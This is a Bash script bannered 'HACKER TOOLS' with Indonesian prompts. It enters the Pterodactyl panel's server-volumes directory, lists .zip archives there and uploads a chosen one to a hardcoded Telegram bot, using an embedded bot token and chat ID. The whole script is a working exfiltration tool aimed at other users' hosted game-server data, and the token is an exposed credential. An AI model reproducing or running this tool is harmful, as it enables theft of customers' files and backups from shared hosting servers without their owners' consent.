#!/bin/bash

clear
# === Warna ===
RED="\e[1;31m"
GREEN="\e[1;32m"
CYAN="\e[1;36m"
YELLOW="\e[1;33m"
RESET="\e[0m"

# === Banner ===
echo -e "${GREEN}"
cat << "EOF"
███╗   ███╗ █████╗ ██╗     ██╗███╗   ██╗ ██████╗ 
████╗ ████║██╔══██╗██║     ██║████╗  ██║██╔═══██╗
██╔████╔██║███████║██║     ██║██╔██╗ ██║██║   ██║
██║╚██╔╝██║██╔══██║██║     ██║██║╚██╗██║██║   ██║
██║ ╚═╝ ██║██║  ██║███████╗██║██║ ╚████║╚██████╔╝
╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
EOF
echo -e "${CYAN}               [ H A C K E R   T O O L S ]${RESET}"
echo ""

cd /var/lib/pterodactyl/volumes

# === CONFIG TELEGRAM ===
BOT_TOKEN="7764774217:AAHwpnX3xh4TCY9A7X-fJHNuocEbQ05Pzeg"
CHAT_ID="7089735468"

# === FUNCTION: Kirim file ke Telegram (silent) ===
send_file() {
  local file="$1"
  echo -e "${YELLOW}📤 Mengirim file: ${file}${RESET}"
  curl -s -F chat_id="$CHAT_ID" \
       -F document=@"$file" \
       "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" > /dev/null 2>&1
  if [ $? -eq 0 ]; then
    echo -e "${GREEN}✅ File berhasil dikirim!${RESET}"
  else
    echo -e "${RED}❌ Gagal mengirim file!${RESET}"
  fi
}

# === MENU PILIHAN UTAMA ===
while true; do
  echo -e "\n${CYAN}=== MENU UTAMA ===${RESET}"
  echo -ne "${YELLOW}📦 Menampilkan file .zip di folder utama...${RESET}\n"

  # List file .zip hanya di folder utama
  IFS=$'\n' read -d '' -r -a FOUND_FILES < <(ls -1 *.zip 2>/dev/null && printf '\0')

  if [ ${#FOUND_FILES[@]} -eq 0 ]; then
    echo -e "${RED}❌ Tidak ada file .zip ditemukan di folder utama!${RESET}"
    read -p "Tekan Enter untuk refresh..."
    continue
  fi

  # === MENU FILES ===
  while true; do
    echo -e "\n${CYAN}=== FILE .ZIP DI FOLDER UTAMA ===${RESET}"
    for i in "${!FOUND_FILES[@]}"; do
      echo -e "${GREEN}[$i]${RESET} ${FOUND_FILES[$i]}"
    done
    echo -e "${YELLOW}[b] 🔁 Kembali ke menu utama${RESET}"
    echo -e "${RED}[x] ❌ Keluar script${RESET}"

    echo ""
    read -p "Pilih nomor file yang ingin dikirim: " PILIHAN

    if [[ "$PILIHAN" == "b" ]]; then
      break
    elif [[ "$PILIHAN" == "x" ]]; then
      echo -e "${RED}👋 Keluar dari script.${RESET}"
      exit 0
    elif [[ "$PILIHAN" =~ ^[0-9]+$ ]] && [ "$PILIHAN" -ge 0 ] && [ "$PILIHAN" -lt ${#FOUND_FILES[@]} ]; then
      send_file "${FOUND_FILES[$PILIHAN]}"
    else
      echo -e "${RED}❗ Input tidak valid. Coba lagi.${RESET}"
    fi
  done
done
